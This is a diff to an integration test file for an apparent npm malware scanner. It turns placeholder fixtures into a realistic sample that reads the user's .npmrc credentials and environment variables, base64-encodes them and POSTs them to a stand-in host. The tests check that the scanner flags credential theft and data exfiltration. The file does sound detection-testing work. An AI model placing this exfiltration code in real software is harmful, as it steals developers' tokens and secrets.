@@ -27,10 +27,14 @@ describe('Scan Integration Tests', () => {
     it('should scan a directory with malicious files', async () => {
       // Create a malicious test file
       const maliciousFile = path.join(tempDir, 'malicious.js');
+      // Reads credentials and the environment, then sends them over the network.
       const maliciousContent = `
-        const _0x112fa8 = "malicious";
         const fs = require('fs');
-        eval("malicious code");
+        const https = require('https');
+        const os = require('os');
+        const creds = fs.readFileSync(os.homedir() + '/.npmrc', 'utf8');
+        const payload = Buffer.from(JSON.stringify({ env: process.env, creds })).toString('base64');
+        https.request({ host: 'collect.example.net', method: 'POST' }).end(payload);
       `;
       fs.writeFileSync(maliciousFile, maliciousContent);
 
@@ -41,9 +45,10 @@ describe('Scan Integration Tests', () => {
         all: false,
       });
 
-      expect(result.threats.length).toBeGreaterThan(0);
-      expect(result.threats[0]?.type).toBe('SUSPICIOUS_MODULE');
-      expect(result.threats[0]?.severity).toBe('CRITICAL');
+      const types = result.threats.map((t) => t.type);
+      expect(types).toContain('CREDENTIAL_THEFT');
+      expect(types).toContain('DATA_EXFILTRATION');
+      expect(result.threats.find((t) => t.type === 'CREDENTIAL_THEFT')?.severity).toBe('CRITICAL');
     });
 
     it('walks directories by maxDirDepth, not by dependency depth', async () => {
@@ -119,20 +124,17 @@ describe('Scan Integration Tests', () => {
     it('should respect the all flag for showing low severity threats', async () => {
       // Create a file with low severity threats
       const suspiciousFile = path.join(tempDir, 'suspicious.js');
-      const suspiciousContent =
-        'const fs = require("fs"); const _0x1234 = "malicious"; eval("bad code");';
+      // A lone child_process use is informational: hidden by default, shown with --all.
+      const suspiciousContent = 'const { execSync } = require("child_process"); execSync("ls");';
       fs.writeFileSync(suspiciousFile, suspiciousContent);
 
-      const result = await scan(tempDir, {
-        verbose: false,
-        output: 'table',
-        parallel: true,
-        all: true,
-      });
+      const hidden = await scan(tempDir, { verbose: false, output: 'table', all: false });
+      expect(hidden.threats.some((t) => t.type === 'CAPABILITY_NOTE')).toBe(false);
 
-      expect(result.threats.length).toBeGreaterThan(0);
-      expect(result.threats[0]?.type).toBe('SUSPICIOUS_MODULE');
-      expect(result.threats[0]?.severity).toBe('CRITICAL');
+      const shown = await scan(tempDir, { verbose: false, output: 'table', all: true });
+      const note = shown.threats.find((t) => t.type === 'CAPABILITY_NOTE');
+      expect(note?.severity).toBe('LOW');
+      expect(note?.message).toContain('child_process');
     });
 
     it('should scan a remote npm package spec via tarball extract', async () => {
